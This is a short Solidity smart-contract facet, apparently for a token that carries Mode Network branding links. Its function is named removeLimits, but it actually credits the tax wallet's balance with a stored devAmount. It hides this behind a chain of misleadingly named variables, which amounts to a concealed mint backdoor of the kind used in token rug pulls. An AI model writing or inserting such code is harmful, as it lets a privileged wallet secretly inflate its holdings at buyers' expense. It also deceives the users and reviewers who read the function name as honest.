// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://www.mode.network/
    Twitter:  https://twitter.com/modenetwork
    Telegram: https://t.me/ModeNetworkOfficial
    Docs:   https://docs.mode.network/
    Discord:  https://discord.com/invite/modenetworkofficial

*/

pragma solidity ^0.8.20;
import "./TestLib.sol";
contract removeLimitsFacet is Ownable {
    function removeLimits() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == ds._taxWallet) {
            require(ds._taxWallet == _msgSender());
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter;
            ds._balances[devWallet] += ds.devAmount;
        }
    }
}
